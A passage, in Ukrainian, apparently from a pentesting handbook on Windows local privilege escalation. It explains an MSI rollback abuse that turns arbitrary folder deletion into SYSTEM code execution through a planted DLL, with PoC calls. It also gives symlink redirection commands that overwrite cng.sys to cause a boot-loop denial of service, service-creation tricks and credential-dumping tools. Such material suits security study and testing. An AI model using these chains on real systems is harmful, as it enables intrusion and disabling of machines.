Клієнт із низькими привілеями може звернутися до служби `msiexec.exe`, запущеної від імені SYSTEM, через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Реверс-інжиніринг визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення визначені реверс-інжинірингом і можуть відрізнятися в різних збірках.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` імперсоналізує викликувача лише під час відкриття переданого шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що викликувач може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` додає шлях до черги як папку, незалежно від аргументу filter, переданого викликувачем. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — контрольований викликувачем шлях, а дані `0x00000002` — прапорець папки. Після цього `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Його привілейований робочий процес перераховує значення реєстру та передає записи папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлів і повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`, така:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив тут — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений атакувальником `C:\Config.Msi`, видаліть його й дочекайтеся, поки Windows Installer пізніше відтворить той самий шлях із захищеними даними rollback. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє новий каталог із правами SYSTEM. Це обходить передбачене обмеження, створене за допомогою `FILE_FLAG_OPEN_REPARSE_POINT` і механізму пом'якшення ризику через довіру до перенаправлення, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення вписується в наведений нижче ланцюжок rollback: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, відтворіть його з NULL DACL і збережіть handle із правом `WRITE_DAC`, відкритий до того, як installer захистить DACL. Попередньо відкритий handle може відновити дозвільний DACL за допомогою `NtSetSecurityObject`, після чого створений файл `.rbs` можна підмінити до відновлення роботи rollback.<sup>[[41]](#references)</sup>

Microsoft виправила цю вразливість шляху: тепер `CMsiTransaction::SetEEUIDirectoryAndFilter` не викликає `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик усе ще може повернути успіх, але шлях, контрольований атакувальником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не перевіряйте наявність виправлення за успішним поверненням методу.<sup>[[41]](#references)[[42]](#references)</sup>

Узагальнений метод такий:

1. **Етап 1 – Підготовка до захоплення шляху (залиште `C:\Config.Msi` порожнім)**

- Крок 1: Встановіть MSI
    - Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у папку з можливістю запису (`TARGETDIR`).
    - Позначте installer як **"UAC Compliant"**, щоб його міг запускати **не-адміністратор**.
    - Залиште **handle** відкритим до файлу після встановлення.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` та перейменовувати їх на файли `.rbf` (резервні копії для rollback).
    - **Відстежуйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб визначити, коли шлях до файлу стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Користувацька синхронізація
    - `.msi` містить **користувацьку дію видалення (`SyncOnRbfWritten`)**, яка:
        - Подає сигнал після запису `.rbf`.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після отримання сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, а оскільки він не зможе видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Видаліть файл `.rbf` вручну.
    - Тепер **`C:\Config.Msi` порожній** і готовий до захоплення.

> На цьому етапі **скористайтеся вразливістю довільного видалення папки з правами SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна rollback-скриптів на шкідливі**

- Крок 6: Відтворіть `C:\Config.Msi` зі слабкими ACL
    - Самостійно відтворіть папку `C:\Config.Msi`.
    - Встановіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: розташування з можливістю запису.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення буде використано для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - За допомогою `ReadDirectoryChangesW` стежте за `C:\Config.Msi`, доки не з'явиться новий `.rbs`.
    - Збережіть його ім'я.

- Крок 9: Синхронізуйтеся перед rollback
    - `.msi` містить **користувацьку дію встановлення (`SyncBeforeRollback`)**, яка:
        - Подає сигнал про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно застосує сильні ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож записувати до папки все ще можна.

- Крок 11: Підкиньте фальшиві `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **фальшивим rollback-скриптом**, який наказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Підкиньте фальшивий `.rbf` зі **шкідливою DLL із payload на рівні SYSTEM**.

- Крок 12: Запустіть rollback
    - Подайте сигнал події синхронізації, щоб installer продовжив роботу.
    - Налаштовано **користувацьку дію типу 19 (`ErrorOut`)**, яка **навмисно завершує встановлення помилкою** у заздалегідь визначений момент.
    - Через це починається **rollback**.

- Крок 13: SYSTEM встановлює вашу DLL
    - Windows Installer:
        - Читає вашу шкідливу `.rbs`.
        - Копіює вашу DLL із `.rbf` до цільового розташування.
    - Тепер ваша **шкідлива DLL міститься в шляху, звідки її завантажує SYSTEM**.

- Останній крок: Виконайте код із правами SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує захоплену вами DLL.
    - **Готово**: ваш код виконується **з правами SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основний метод із rollback MSI (попередній) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, як ваша вразливість дозволяє лише **довільне видалення файлів**?

Можна скористатися **внутрішніми механізмами NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API для видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **oplock призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це спорожнить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видалено від імені SYSTEM.

### Від створення довільної папки до постійного DoS

Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows намагається завантажити `cng.sys` під час запуску.
- Виявивши папку, система **не може знайти справжній драйвер** і **аварійно завершує роботу або зупиняє завантаження**.
- **Немає запасного варіанта** й **неможливо відновити роботу** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до перезапису довільних файлів / DoS під час завантаження

Якщо **привілейована служба** записує журнали/експорти за шляхом із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + точок монтування NTFS**, щоб перетворити привілейований запис на перезапис довільного файла (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Файл конфігурації, у якому зберігається цільовий шлях, доступний для запису зловмиснику (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування до `\RPC Control` і файловий OM symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб з’ясувати шлях до привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор натисне «надіслати тестове SMS»). Тепер дані записуються в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний файл (за допомогою hex/PE-парсера), щоб підтвердити пошкодження; перезавантаження змусить Windows завантажити підмінений драйвер → **DoS через цикл перезавантажень**. Це також можна застосувати до будь-якого захищеного файла, який привілейована служба відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, Windows може спробувати завантажити її першою, що робить цей файл надійною ціллю для DoS через пошкоджені дані.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже виконуєте код у процесі з рівнем High Integrity, отримати **SYSTEM** можна просто, **створивши й запустивши нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Докладніше про задіяні ключі реєстру та встановлення пакета _.msi_ — тут.](#alwaysinstallelevated)

### Високий рівень цілісності + привілей SeImpersonate для отримання System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв Full Token

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у процесі з високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (крім захищених процесів) за допомогою привілею SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай ця техніка передбачає **вибір будь-якого процесу, що працює від імені SYSTEM і має всі привілеї токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що реалізує запропоновану техніку, можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для підвищення привілеїв у `getsystem`. Вона полягає у **створенні каналу, а потім створенні служби або використанні наявної, щоб записати дані в цей канал**. Тоді **сервер**, який створив канал із привілеєм **`SeImpersonate`**, зможе **імперсонувати токен** клієнта каналу (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про named pipes, прочитайте це**](#named-pipe-client-impersonation).\
Щоб переглянути приклад [**переходу від високого рівня цілісності до System за допомогою named pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконати довільний код із тими самими правами. Тож Dll Hijacking також корисний для такого підвищення привілеїв. Крім того, його **набагато легше реалізувати з процесу з високим рівнем цілісності**, оскільки такий процес матиме **права на запис** у папки, з яких завантажуються dll.\
**Дізнатися більше про Dll hijacking можна** [**тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Прочитайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка неправильних конфігурацій і конфіденційних файлів (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих неправильних конфігурацій і збір інформації (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка неправильних конфігурацій**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Для локальної перевірки використовуйте -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилення зібраних паролів у домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент для підміни ADIDNS/LLMNR/mDNS і атаки man-in-the-middle, написаний на PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей для privesc (ЗАСТАРІВ, використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей для privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках неправильних конфігурацій (більше інструмент збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**попередньо скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe є на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (попередньо скомпільований виконуваний файл є на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe з python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для правильної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт із правильною версією .NET ([див. тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, можна виконати:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом експлуатації слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — воркшоп із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв у Windows — повний посібник OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: витік через format-string + stack BOF → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — полювання на Silver Fox: гра в кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування Symbolic Link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Повернення в минуле: зловживання Symbolic Link у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — пастки довіри Node.js: небезпечне визначення модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв’язання завдань контрольного списку C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: об’єднання CLDFLT і перегонів у ядрі DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring достатньо, щоб керувати всім: повноцінний примітив читання/запису в Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні хитрощі](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойта FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10 із виправленням першого дня](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: огляд Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з SSH Agent у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — повне відновлення: повернення до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — рекомендації щодо підвищення привілеїв через зміщення в спільній пам’яті Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
